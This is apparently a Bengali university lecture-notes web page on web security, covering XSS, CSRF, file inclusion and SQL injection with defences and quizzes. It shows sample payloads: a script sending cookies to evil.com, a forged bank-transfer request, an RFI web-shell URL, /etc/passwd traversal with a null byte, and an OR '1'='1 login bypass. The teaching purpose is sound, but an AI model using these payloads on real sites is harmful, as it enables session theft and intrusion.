@@ -1,0 +1,225 @@
+<!doctype html>
+<html lang="bn">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Lecture 26 · XSS, CSRF, SQL Injection</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/style.css">
+</head>
+<body data-lecture="L26">
+<header class="topbar">
+  <a class="home" href="index.html">🔐 <b>CSE 477</b> নোট</a>
+  <span class="spacer"></span>
+  <div class="progress"><i></i></div><span class="progress-label"></span>
+  <button class="icon-btn" data-theme-toggle title="লাইট/ডার্ক">🌓</button>
+</header>
+
+<div class="layout">
+<aside class="sidebar"><h4>Lecture 26 – সূচি</h4><ol id="toc"></ol></aside>
+<main>
+
+<div class="hero">
+  <div class="kicker">LECTURE 26</div>
+  <h1>Web Security III — XSS, CSRF, File Inclusion ও SQL Injection</h1>
+  <p>Client-side আক্রমণ: Cross-Site Scripting (persistent ও non-persistent), Cross-Site Request Forgery (login CSRF সহ) ও তাদের প্রতিরক্ষা; ব্যবহারকারীর নিরাপদ ব্রাউজিং অভ্যাস ও browser-এর নিরাপত্তা ব্যবস্থা; তারপর server-side আক্রমণ: RFI, LFI ও SQL injection।</p>
+  <div class="chips"><span class="chip">Persistent XSS</span><span class="chip">Reflected XSS</span><span class="chip">CSRF</span><span class="chip">Referer · token</span><span class="chip">RFI · LFI · %00</span><span class="chip">' OR '1'='1</span></div>
+</div>
+
+<section class="topic" id="xss">
+  <h2>Cross-Site Scripting (XSS)</h2>
+  <p>সবচেয়ে সাধারণ web দুর্বলতার একটা। ওয়েবসাইটের <b>অপর্যাপ্ত input validation</b>-এর সুযোগে ক্ষতিকর user সাইটে কোড inject করে, যা পরে <b>অন্য ভিজিটরের browser-এ</b> চলে।</p>
+  <div class="box exam"><span class="label">🎯 কেন বিপজ্জনক</span><p>Inject করা script চলে <b>বিশ্বস্ত সাইটের নামে</b> — তাই সেই সাইটের DOM, form, এবং (HttpOnly না থাকলে) <b>cookie</b> পায় → session hijacking (Lecture 25)।</p></div>
+  <div class="tabs">
+    <div class="tab-btns"><button>Persistent (Stored)</button><button>Non-persistent (Reflected)</button></div>
+    <div class="tab-pane">
+      <p>Inject করা কোড সাইটে <b>কিছু সময় থেকে যায়</b> এবং অন্য user-রা দেখে। ক্লাসিক উদাহরণ: সংবাদ/সোশ্যাল সাইটের <b>guestbook / message board</b>। Input sanitize না করলে attacker এমন comment লেখে:</p>
+      <div class="formula">Nice article!
+&lt;script&gt;
+  document.location = "http://evil.com/steal.php?c=" + document.cookie;
+&lt;/script&gt;</div>
+      <p>যে-ই ওই page দেখে, তার cookie attacker-এর সার্ভারে চলে যায়।</p>
+    </div>
+    <div class="tab-pane">
+      <p>Inject করা কোড attacker-এর session-এর পরে থাকে না; বাস্তবে এটাই বেশি। ক্লাসিক উদাহরণ: <b>search page যা query ফিরিয়ে দেখায়</b> — “security book” খুঁজলে page শুরু হয়: <i>Search results for security book</i>।</p>
+      <p>Sanitize না করলে search box-এ কোড দিলে সেটা page-এ content হিসেবে বসে কোড হিসেবে চলে। Attacker victim-কে এমন লিংক পাঠায়:</p>
+      <div class="formula">http://www.site.com/search?q=&lt;script&gt;…document.cookie…&lt;/script&gt;</div>
+      <p>Victim ক্লিক করলে বিশ্বস্ত site.com-ই script-টা “reflect” করে victim-এর browser-এ চালায়।</p>
+    </div>
+  </div>
+  <div class="lab"><span class="label">🧪 Search page: sanitize করলে কী বদলায় (কোড এখানে কখনো চলে না — শুধু দেখানো হচ্ছে)</span>
+    <div class="row"><label for="xq">Search box</label><input type="text" id="xq" value="&lt;script&gt;alert(document.cookie)&lt;/script&gt;" style="flex:1"></div>
+    <div class="row"><label><input type="checkbox" id="xsan"> Output encode / sanitize চালু</label></div>
+    <div class="out" id="xout"></div>
+  </div>
+  <h3>XSS প্রতিরক্ষা</h3>
+  <ul>
+    <li><b>Proxy-based:</b> browser ও server-এর HTTP ট্রাফিক বিশ্লেষণ করে বিশেষ HTML অক্ষর (<code>&lt; &gt; " '</code>) খোঁজে ও page চালানোর আগে <b>encode</b> করে — যেমন Firefox plugin <b>NoScript</b>।</li>
+    <li><b>Application-level firewall:</b> HTML page-এ সংবেদনশীল তথ্য ফাঁস করতে পারে এমন hyperlink খোঁজে; connection rule দিয়ে খারাপ request থামায়।</li>
+    <li>(সাধারণ নিয়ম) Server-এ সব input validate ও output encode; cookie-তে HttpOnly।</li>
+  </ul>
+</section>
+
+<section class="topic" id="csrf">
+  <h2>Cross-Site Request Forgery (CSRF)</h2>
+  <div class="box exam"><span class="label">🎯 XSS বনাম CSRF</span><p><b>XSS</b> কাজে লাগায় user-এর একটা নির্দিষ্ট <b>সাইটের প্রতি বিশ্বাস</b>। <b>CSRF</b> কাজে লাগায় সাইটের একটা নির্দিষ্ট <b>user-এর প্রতি বিশ্বাস</b> — ক্ষতিকর সাইট user-কে দিয়ে অজান্তে এমন third-party সাইটে command চালায় যেটা user-কে বিশ্বাস করে।</p></div>
+  <h3>naivebank.com উদাহরণ</h3>
+  <div class="stepper">
+    <div class="step"><div class="flow"><span class="node">👤 User</span><span class="arr">login ✅ (cookie পেল)</span><span class="node b">🏦 naivebank.com</span></div><p><b>১.</b> User www.naivebank.com-এ অনলাইন ব্যাংকিং করে, logged in — browser-এ session cookie আছে।</p></div>
+    <div class="step"><div class="flow"><span class="node">👤 User</span><span class="arr">ভিজিট →</span><span class="node" style="border-color:var(--bad)">😈 evilsite.com</span></div><p><b>২.</b> একই browser-এ (logout না করে) user ঘুরতে ঘুরতে www.evilsite.com-এ গেল, যেখানে আছে:</p>
+      <div class="formula">&lt;script&gt;
+document.location = 'http://www.naivebank.com/transferFunds.php?amount=10000&amp;fromID=1234&amp;toID=5678';
+&lt;/script&gt;</div></div>
+    <div class="step"><div class="flow"><span class="node">👤 User-এর browser<br><small>Cookie স্বয়ংক্রিয় যুক্ত!</small></span><span class="arr">GET transferFunds…</span><span class="node b">🏦 naivebank.com</span></div><p><b>৩.</b> Browser ব্যাংকে redirect করে এবং নিয়মমতো naivebank-এর cookie <b>নিজে থেকেই</b> জুড়ে দেয়। ব্যাংকের কাছে request সম্পূর্ণ বৈধ দেখায়।</p></div>
+    <div class="step"><div class="flow"><span class="node b">🏦 #1234</span><span class="arr">$10,000 →</span><span class="node" style="border-color:var(--bad)">😈 #5678</span></div><p><b>৪.</b> Victim-এর অ্যাকাউন্ট (#1234) থেকে attacker-এর অ্যাকাউন্টে (#5678) $10,000! User কিছুই টের পেল না।</p></div>
+  </div>
+  <h3>Login CSRF</h3>
+  <p>নতুন রূপ: ক্ষতিকর সাইট user-এর হয়ে cross-site request পাঠায়, কিন্তু user হিসেবে নয় — <b>user-কে attacker হিসেবে login করিয়ে দেয়</b>। উদাহরণ: অসৎ merchant PayPal-এ পেমেন্ট নেয়; user PayPal-এ login করে পেমেন্টের পর merchant চুপচাপ forged request দিয়ে user-কে <b>attacker-এর অ্যাকাউন্টে</b> পুনরায় login করায়। User না জেনে credit card তথ্য দিলে তা attacker-এর অ্যাকাউন্টে জমা হয় — পরে সে দেখে নেয়।</p>
+  <h3>CSRF প্রতিরক্ষা</h3>
+  <p>ঠেকানো <b>খুব কঠিন</b> — সাইটের কাছে request বৈধ দেখায়।</p>
+  <ul>
+    <li><b>Referer HTTP header</b> পর্যবেক্ষণ — request-এর আগে কোন সাইটে ছিল তা দেখায় (evilsite.com থেকে এলে বাতিল)। কিন্তু privacy-আক্রমণাত্মক।</li>
+    <li>শুধু cookie নয়, প্রতিটা request-এর সাথে একটা <b>session token</b> (hidden field) পাঠানো — attacker-কে সেই token জানতে হবে। প্রতি session-এ ভিন্ন token।</li>
+    <li>আর প্রতিবার কাজ শেষে <b>logout</b> করতে ভুলো না!</li>
+  </ul>
+  <div class="quiz" data-answer="1">
+    <div class="q">CSRF কেন সফল হয়?</div>
+    <button class="opt">User-এর password দুর্বল</button><button class="opt">Browser ওই সাইটের cookie প্রতিটা request-এ নিজে থেকেই জুড়ে দেয়, আর সাইট শুধু cookie দেখে user-কে বিশ্বাস করে</button><button class="opt">সাইটে HTTPS নেই</button><button class="opt">DNS poisoned</button>
+    <div class="explain">তাই cookie-র বাইরে একটা অনুমানের অযোগ্য token লাগে।</div>
+  </div>
+</section>
+
+<section class="topic" id="client">
+  <h2>Client-side প্রতিরক্ষা: নিরাপদ অভ্যাস ও Browser ব্যবস্থা</h2>
+  <h3>Safe-browsing practices</h3>
+  <ul>
+    <li>ইমেইল বা অবিশ্বস্ত সাইটের অজানা লিংকে ক্লিক নয়।</li>
+    <li>ব্যক্তিগত তথ্য দেওয়ার আগে <b>HTTPS</b> নিশ্চিত — padlock বা address bar-এর রঙ। Login page HTTPS না হলে নিজে “s” যোগ করো বা HTTPS version খোঁজো।</li>
+    <li>URL ভালো করে দেখো ও certificate error নেই নিশ্চিত করো।</li>
+    <li>অজানা/অবিশ্বস্ত সাইটে কখনো সংবেদনশীল তথ্য নয়।</li>
+  </ul>
+  <h3>Built-in browser security</h3>
+  <div class="tbl-wrap"><table>
+    <tr><th>Browser</th><th>পদ্ধতি</th></tr>
+    <tr><td>Internet Explorer</td><td><b>Zone</b> — ডিফল্টে সব সাইট Internet Zone-এ; user সাইটকে Trusted বা Restricted zone-এ দিতে পারে; প্রতিটা zone-এর আলাদা policy</td></tr>
+    <tr><td>Firefox</td><td>Zone নেই; সব সাইটে একই নিয়ম (plugin দিয়ে trusted/untrusted ভাগ করা যায়)</td></tr>
+    <tr><td>Opera</td><td>ডিফল্ট global setting, তবে নির্দিষ্ট সাইটে আলাদা policy দেওয়া যায়</td></tr>
+  </table></div>
+  <ul><li>পরিচিত phishing/malware সাইটের <b>public blacklist</b>-এ থাকা সাইটে গেলে স্বয়ংক্রিয় সতর্কবার্তা।</li><li><b>NoScript</b>-এর মতো plugin whitelist/blacklist ব্যবহার করে, XSS ধরার চেষ্টা করে ও HTTP request sanitize করে cookie চুরি ঠেকায়।</li><li>সবসময় browser-এর <b>সর্বশেষ version</b>।</li></ul>
+</section>
+
+<section class="topic" id="inclusion">
+  <h2>Server-side: Remote ও Local File Inclusion</h2>
+  <p>Server-side script (যেমন PHP) HTML form থেকে input নিয়ে সার্ভারে চলে। <b>Server-side script inclusion attack</b>-এ web server-এর দুর্বলতা দিয়ে attacker সার্ভারে নিজের script inject করে চালায়।</p>
+  <div class="formula">&lt;?php include($_GET['page']); ?&gt;          ← দুর্বল কোড: user যা বলে তাই include</div>
+  <div class="grid">
+    <div class="box"><span class="label">🌍 RFI (Remote File Inclusion)</span><p>অন্য সার্ভারের remote script চালায়।</p></div>
+    <div class="box"><span class="label">📁 LFI (Local File Inclusion)</span><p>একই সার্ভারের local (ক্ষতিকর/গোপন) ফাইল চালায়/দেখায়।</p></div>
+  </div>
+  <div class="lab"><span class="label">🧪 victim.com/index.php?page=… — সার্ভার কী include করবে?</span>
+    <div class="row"><label for="fi">page =</label><input type="text" id="fi" value="news.php" style="flex:1"></div>
+    <div class="row" style="flex-wrap:wrap;gap:6px">
+      <button class="btn ghost" data-fi="news.php">স্বাভাবিক</button>
+      <button class="btn ghost" data-fi="http://evil.com/shell.php">RFI</button>
+      <button class="btn ghost" data-fi="admin/secretpage.php">LFI: admin page</button>
+      <button class="btn ghost" data-fi="../../../../etc/passwd">LFI: /etc/passwd</button>
+      <button class="btn ghost" data-fi="../../../../etc/passwd%00">LFI + %00</button>
+    </div>
+    <div class="row"><label><input type="checkbox" id="fiext"> সার্ভার শেষে “.php” জুড়ে দেয় (include($page . ".php"))</label></div>
+    <div class="out" id="fiout"></div>
+  </div>
+  <ul>
+    <li>RFI-তে প্রায়ই <b>web shell</b> চালানো হয় — দূর থেকে কমান্ড স্টেশন: সার্ভারে ঘুরে ফাইল দেখা, সম্পাদনা, upload, delete।</li>
+    <li>সৌভাগ্যক্রমে RFI কমছে — বেশিরভাগ PHP installation ডিফল্টে অন্য সার্ভারের কোড চালাতে দেয় না (<code>allow_url_include = Off</code>)।</li>
+    <li>LFI-তে <code>admin/secretpage.php</code> → authentication bypass; <code>../../etc/passwd</code> → “Not found” (কারণ সার্ভার .php যোগ করে); <code>%00</code> যোগ → <b>null byte</b> = string-এর শেষ, এর পরের সব (.php) উপেক্ষা → Bingo!</li>
+  </ul>
+</section>
+
+<section class="topic" id="sqli">
+  <h2>SQL Injection</h2>
+  <p>অনেক web app form থেকে input নিয়ে <b>হুবহু</b> SQL query-তে বসায়: <code>SELECT user FROM table WHERE name = 'user_input';</code>। SQL injection = user input-এর ভেতরে SQL statement ঢোকানো।</p>
+  <h3>SQL দ্রুত রিভিশন</h3>
+  <div class="formula">SELECT * FROM users WHERE age &gt; 20 ORDER BY name LIMIT 5;
+  │        │            │              │             └ কতগুলো row
+  │        │            │              └ কোন column অনুযায়ী সাজানো
+  │        │            └ record filter
+  │        └ কোন table থেকে
+  └ কোন data (ফলাফল result table-এ)</div>
+  <h3>ক্লাসিক login bypass</h3>
+  <div class="formula">select * from users where user='$username' AND pwd='$passwd'</div>
+  <p>Attacker username ও password দুই জায়গায় লেখে <code>M' OR '1'='1</code>:</p>
+  <div class="formula">select * from users where user='M' OR '1'='1' AND pwd='M' OR '1'='1'
+                                      └── সবসময় সত্য ──┘</div>
+  <p>ফল: <b>password ছাড়াই access!</b></p>
+  <div class="lab"><span class="label">🧪 Login form — SQL injection simulator</span>
+    <div class="row"><label for="su">username</label><input type="text" id="su" value="M' OR '1'='1"><label for="sp">password</label><input type="text" id="sp" value="M' OR '1'='1"></div>
+    <div class="row"><label><input type="checkbox" id="sesc"> Input escape / parameterized query চালু</label><button class="btn" id="slogin">Login</button><button class="btn ghost" id="snormal">স্বাভাবিক user দিয়ে</button></div>
+    <div class="out" id="sout"></div>
+  </div>
+  <h3>সমাধান</h3>
+  <ul>
+    <li>কারণ: প্রোগ্রামাররা query বানানোর আগে input <b>sanitize</b> করেন না। প্রতিরোধ তুলনামূলক সহজ।</li>
+    <li>বেশিরভাগ ভাষায় বিপজ্জনক অক্ষর সরানোর built-in function — যেমন PHP-র <code>mysql_real_escape_string</code> (single/double quote escape করে)।</li>
+    <li>Legacy কোডে SQL injection স্বয়ংক্রিয়ভাবে খোঁজার কৌশলও আছে।</li>
+    <li>(আধুনিক best practice) <b>Prepared statement / parameterized query</b> — input কখনো SQL কোড হিসেবে parse হয় না।</li>
+  </ul>
+  <div class="box example"><span class="label">💡 Prepared statement</span><div class="formula">$stmt = $db-&gt;prepare("SELECT * FROM users WHERE user = ? AND pwd = ?");
+$stmt-&gt;execute([$username, $passwd]);   // input শুধুই data</div></div>
+</section>
+
+<section class="topic" id="dosweb">
+  <h2>Web Server DoS ও সারাংশ</h2>
+  <p>স্লাইডের শেষে web server-কে DoS করার ছবি — Lecture 21-এর SYN flood/DDoS ছাড়াও application স্তরে: প্রচুর ভারী request (বড় search, বারবার login), অল্প অল্প করে request পাঠিয়ে connection ধরে রাখা (Slowloris) — সার্ভারের থ্রেড/মেমরি শেষ।</p>
+  <div class="tbl-wrap"><table>
+    <tr><th>আক্রমণ</th><th>কোথায় চলে</th><th>কী কাজে লাগায়</th><th>প্রধান প্রতিরক্ষা</th></tr>
+    <tr><td>XSS</td><td>Victim-এর browser</td><td>User-এর সাইটের প্রতি বিশ্বাস</td><td>Input validation, output encoding, HttpOnly</td></tr>
+    <tr><td>CSRF</td><td>Victim-এর browser → সাইট</td><td>সাইটের user-এর প্রতি বিশ্বাস</td><td>Per-session token, Referer, logout</td></tr>
+    <tr><td>RFI / LFI</td><td>Server</td><td>Include-এ unchecked input</td><td>Whitelist, allow_url_include off</td></tr>
+    <tr><td>SQL injection</td><td>Server → database</td><td>Query-তে unsanitized input</td><td>Escape, prepared statement</td></tr>
+  </table></div>
+</section>
+
+<section class="topic" id="review">
+  <h2>রিভিশন কুইজ</h2>
+  <div class="quiz" data-answer="0">
+    <div class="q">১) Guestbook-এ রাখা script পরে প্রত্যেক ভিজিটরের browser-এ চলে — কোন আক্রমণ?</div>
+    <button class="opt">Persistent XSS</button><button class="opt">Non-persistent XSS</button><button class="opt">CSRF</button><button class="opt">LFI</button>
+    <div class="explain">সাইটে থেকে যায় = persistent।</div>
+  </div>
+  <div class="quiz" data-answer="2">
+    <div class="q">২) “Site-এর user-এর প্রতি বিশ্বাস” কাজে লাগায় কোনটা?</div>
+    <button class="opt">XSS</button><button class="opt">SQL injection</button><button class="opt">CSRF</button><button class="opt">Phishing</button>
+    <div class="explain">CSRF = XSS-এর উল্টো।</div>
+  </div>
+  <div class="quiz" data-answer="3">
+    <div class="q">৩) LFI-তে %00 কেন যোগ করা হয়?</div>
+    <button class="opt">URL encode করতে</button><button class="opt">Cookie চুরি করতে</button><button class="opt">SQL comment</button><button class="opt">Null byte string শেষ করে — সার্ভারের জুড়ে দেওয়া “.php” উপেক্ষা হয়</button>
+    <div class="explain">তাই /etc/passwd.php না খুঁজে /etc/passwd খোলে।</div>
+  </div>
+  <div class="quiz" data-answer="1">
+    <div class="q">৪) SQL injection-এর মূল কারণ?</div>
+    <button class="opt">Database-এ password নেই</button><button class="opt">Query বানানোর আগে user input sanitize করা হয়নি</button><button class="opt">HTTPS নেই</button><button class="opt">ORDER BY ব্যবহার</button>
+    <div class="explain">স্লাইড: programmers failing to sanitize user input।</div>
+  </div>
+  <div class="box exam"><span class="label">🎯 সম্ভাব্য পরীক্ষার প্রশ্ন</span><ul>
+    <li>XSS কী? Persistent ও non-persistent উদাহরণসহ; প্রতিরক্ষা।</li>
+    <li>CSRF (naivebank উদাহরণ); XSS-এর সাথে পার্থক্য; login CSRF; প্রতিরক্ষা।</li>
+    <li>Safe-browsing অভ্যাস; IE zone বনাম Firefox বনাম Opera।</li>
+    <li>RFI ও LFI; web shell; %00 null byte কৌশল।</li>
+    <li>SQL injection দিয়ে login bypass দেখাও; সমাধান।</li>
+  </ul></div>
+</section>
+
+<div class="pager">
+  <a href="lecture25.html"><small>← আগের লেকচার</small>Lecture 25: Web Security II</a>
+  <a class="next" href="index.html"><small>শেষ! →</small>হোমে ফিরে যাও</a>
+</div>
+<div class="score-box"></div>
+</main>
+</div>
+<script src="js/app.js"></script>
+<script src="js/l26.js"></script>
+</body>
+</html>
